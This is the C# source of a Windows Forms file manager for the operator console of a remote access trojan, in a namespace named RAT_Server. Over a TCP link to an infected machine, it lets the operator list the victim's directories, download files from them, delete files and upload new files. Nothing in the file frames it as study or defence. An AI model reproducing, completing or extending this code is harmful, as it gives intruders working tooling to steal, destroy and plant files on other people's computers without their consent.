using System;
using System.IO;
using System.Net.Sockets;
using System.Windows.Forms;

namespace RAT_Server
{
    public partial class FileManagerForm : Form
    {
        private TcpClient client;
        private NetworkStream stream;
        private StreamWriter writer;
        private StreamReader reader;
        private string currentPath = "C:\\";

        public FileManagerForm(TcpClient client)
        {
            InitializeComponent();
            this.client = client;
            stream = client.GetStream();
            writer = new StreamWriter(stream) { AutoFlush = true };
            reader = new StreamReader(stream);
            LoadDirectory(currentPath);
        }

        private void LoadDirectory(string path)
        {
            try
            {
                writer.WriteLine($"LIST|{path}");
                string response = reader.ReadLine();
                if (response == null) return;
                listViewFiles.Items.Clear();
                if (response.StartsWith("ERROR"))
                {
                    MessageBox.Show(response);
                    return;
                }

                var parts = response.Split('|');
                var dirs = parts[0].Split(new[] { ';' }, StringSplitOptions.RemoveEmptyEntries);
                var files = parts.Length > 1 ? parts[1].Split(new[] { ';' }, StringSplitOptions.RemoveEmptyEntries) : Array.Empty<string>();

                foreach (var dir in dirs)
                {
                    var item = new ListViewItem(Path.GetFileName(dir));
                    item.SubItems.Add("DIR");
                    item.Tag = dir;
                    listViewFiles.Items.Add(item);
                }
                foreach (var file in files)
                {
                    var item = new ListViewItem(Path.GetFileName(file));
                    item.SubItems.Add("FILE");
                    item.Tag = file;
                    listViewFiles.Items.Add(item);
                }

                currentPath = path;
                textBoxPath.Text = currentPath;
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error: {ex.Message}");
            }
        }

        private void buttonUp_Click(object sender, EventArgs e)
        {
            var parent = Directory.GetParent(currentPath);
            if (parent != null)
            {
                LoadDirectory(parent.FullName);
            }
        }

        private void listViewFiles_DoubleClick(object sender, EventArgs e)
        {
            if (listViewFiles.SelectedItems.Count == 0) return;
            var item = listViewFiles.SelectedItems[0];
            var path = item.Tag.ToString();
            if (item.SubItems[1].Text == "DIR")
            {
                LoadDirectory(path);
            }
            else
            {
                DownloadFile(path);
            }
        }

        private void DownloadFile(string path)
        {
            using (var sfd = new SaveFileDialog())
            {
                sfd.FileName = Path.GetFileName(path);
                if (sfd.ShowDialog() == DialogResult.OK)
                {
                    writer.WriteLine($"DOWNLOAD|{path}");
                    string sizeLine = reader.ReadLine();
                    if (!int.TryParse(sizeLine, out int size))
                    {
                        MessageBox.Show(sizeLine);
                        return;
                    }
                    var buffer = new byte[size];
                    int read = 0;
                    while (read < size)
                    {
                        int r = stream.Read(buffer, read, size - read);
                        if (r <= 0) break;
                        read += r;
                    }
                    File.WriteAllBytes(sfd.FileName, buffer);
                    MessageBox.Show("Archivo descargado.");
                }
            }
        }

        private void menuDelete_Click(object sender, EventArgs e)
        {
            if (listViewFiles.SelectedItems.Count > 0)
            {
                var item = listViewFiles.SelectedItems[0];
                var path = item.Tag.ToString();
                writer.WriteLine($"DELETE|{path}");
                string resp = reader.ReadLine();
                if (resp.StartsWith("OK"))
                {
                    LoadDirectory(currentPath);
                }
                else
                {
                    MessageBox.Show(resp);
                }
            }
        }

        private void menuUpload_Click(object sender, EventArgs e)
        {
            using (var ofd = new OpenFileDialog())
            {
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    var dest = Path.Combine(currentPath, Path.GetFileName(ofd.FileName));
                    var data = File.ReadAllBytes(ofd.FileName);
                    writer.WriteLine($"UPLOAD|{dest}|{data.Length}");
                    stream.Write(data, 0, data.Length);
                    stream.Flush();
                    string resp = reader.ReadLine();
                    if (resp.StartsWith("OK"))
                    {
                        LoadDirectory(currentPath);
                    }
                    else
                    {
                        MessageBox.Show(resp);
                    }
                }
            }
        }
    }
}
